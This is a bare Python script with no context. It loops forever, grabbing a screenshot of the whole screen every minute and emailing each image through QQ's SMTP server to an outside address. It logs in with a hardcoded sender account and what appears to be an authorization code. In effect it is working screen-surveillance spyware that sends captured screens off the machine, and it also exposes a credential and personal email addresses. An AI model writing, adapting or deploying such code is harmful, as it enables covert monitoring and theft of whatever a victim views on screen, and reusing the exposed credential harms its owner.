from PIL import ImageGrab
import time,smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
while True:
    pic = ImageGrab.grab()
    pic.save(r'C:\Users\10143\Documents\1.jpg')
    msg=MIMEMultipart()
    msg.attach(MIMEText('asdasdadasd','plain','utf-8'))
    with open(r'C:\Users\10143\Documents\1.jpg', "rb")as f:
        p=f.read()
        
    msg.attach(MIMEImage(p))
    msg['From']='1014397160@qq.com'
    msg['Subject']='dadasdasf'
    serve=smtplib.SMTP_SSL('smtp.qq.com','465')
    serve.login('1014397160@qq.com','dfwcwlxxrtfjbcjd')
    serve.sendmail('1014397160@qq.com','623073156@qq.com',msg.as_string())
    serve.quit()
    time.sleep(60)
